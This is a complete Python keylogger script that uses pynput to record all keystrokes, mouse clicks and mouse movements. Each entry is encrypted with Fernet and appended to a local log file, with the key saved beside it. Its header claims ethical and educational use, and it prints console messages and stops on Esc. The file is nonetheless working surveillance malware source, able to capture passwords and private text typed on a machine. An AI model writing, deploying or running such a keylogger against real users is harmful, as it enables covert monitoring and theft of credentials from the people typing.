
# keylogger.py
# This script captures keystrokes, mouse clicks, and mouse movements, and encrypts them before saving to a file.
# It is intended for ethical and educational use only, in controlled environments.

from pynput import keyboard, mouse
from cryptography.fernet import Fernet
import os
import datetime
import threading

# --- Configuration --- #
LOG_FILE = "encrypted_keylog.txt"  # File to store encrypted keystrokes and mouse events
KEY_FILE = "secret.key"             # File to store the encryption key

# --- Global Listener References (for stopping) --- #
keyboard_listener = None
mouse_listener = None

# --- Encryption Key Management --- #
def generate_or_load_key():
    """
    Generates a new encryption key if one doesn't exist, otherwise loads the existing key.
    The key is stored in a file specified by KEY_FILE.
    """
    if not os.path.exists(KEY_FILE):
        try:
            key = Fernet.generate_key()
            with open(KEY_FILE, "wb") as kf:
                kf.write(key)
            print(f"[INFO] New encryption key generated and saved to {KEY_FILE}")
            return key
        except IOError as e:
            print(f"[ERROR] Could not write encryption key to {KEY_FILE}: {e}")
            # In a real scenario, this would be a critical failure.
            # For educational purposes, we'll exit or handle gracefully.
            exit(1) # Exit if key cannot be saved
    else:
        try:
            with open(KEY_FILE, "rb") as kf:
                key = kf.read()
            print(f"[INFO] Existing encryption key loaded from {KEY_FILE}")
            return key
        except IOError as e:
            print(f"[ERROR] Could not read encryption key from {KEY_FILE}: {e}")
            exit(1) # Exit if key cannot be loaded

# Initialize Fernet cipher with the key
encryption_key = generate_or_load_key()
fernet_cipher = Fernet(encryption_key)

# --- Logging Logic --- #
def write_to_log(data):
    """
    Encrypts the given data and appends it to the log file.
    Includes a timestamp for each entry.
    """
    try:
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        # Encode the data with timestamp, encrypt, and then decode for writing as string
        encrypted_data = fernet_cipher.encrypt(f"[{timestamp}] {data}\n".encode()).decode()
        with open(LOG_FILE, "a") as f:
            f.write(encrypted_data + "\n") # Add an extra newline for readability in encrypted log
    except Exception as e:
        print(f"[ERROR] Could not write to log file {LOG_FILE}: {e}")

# --- Keyboard Logging Functions --- #
def on_press(key):
    """
    Callback function for when a keyboard key is pressed.
    Determines the character/key representation and logs it.
    """
    try:
        # Handle alphanumeric keys
        char = key.char
    except AttributeError:
        # Handle special keys (e.g., space, enter, shift)
        if key == keyboard.Key.space:
            char = "[SPACE]"
        elif key == keyboard.Key.enter:
            char = "[ENTER]"
        elif key == keyboard.Key.backspace:
            char = "[BACKSPACE]"
        elif key == keyboard.Key.tab:
            char = "[TAB]"
        else:
            # Represent other special keys by their name
            char = f"[KEY:{str(key).replace('Key.', '').upper()}]"
    
    write_to_log(str(char))

def on_release(key):
    """
    Callback function for when a keyboard key is released.
    Used to stop the keylogger when the 'esc' key is pressed.
    """
    if key == keyboard.Key.esc:
        print("[INFO] Escape key pressed. Stopping keylogger.")
        # Stop both listeners
        if keyboard_listener:
            keyboard_listener.stop()
        if mouse_listener:
            mouse_listener.stop()
        return False # This stops the keyboard listener thread

# --- Mouse Logging Functions --- #
def on_click(x, y, button, pressed):
    """
    Callback function for when a mouse button is clicked.
    Logs the click event with coordinates and button information.
    """
    action = "PRESSED" if pressed else "RELEASED"
    write_to_log(f"[MOUSE_CLICK: {action} at ({x},{y}) with {button}]")

def on_move(x, y):
    """
    Callback function for when the mouse is moved.
    Logs the mouse movement coordinates.
    Note: This can generate a very large number of logs quickly.
    Consider adding a rate limit for practical use if needed.
    """
    write_to_log(f"[MOUSE_MOVE: ({x},{y})]")

# --- Main Execution --- #
if __name__ == "__main__":
    print(f"[INFO] Keylogger started. Logging to {LOG_FILE}")
    print(f"[INFO] Press 'Esc' to stop the keylogger.")
    
    # Create keyboard listener thread
    keyboard_listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    
    # Create mouse listener thread
    mouse_listener = mouse.Listener(on_click=on_click, on_move=on_move)

    try:
        # Start both listeners in separate threads
        keyboard_listener.start()
        mouse_listener.start()
        
        # Join the listener threads to the main thread to keep the script running
        # The join() calls will complete once the listeners are stopped by on_release
        keyboard_listener.join()
        mouse_listener.join()

    except Exception as e:
        print(f"[CRITICAL] An error occurred with a listener: {e}")



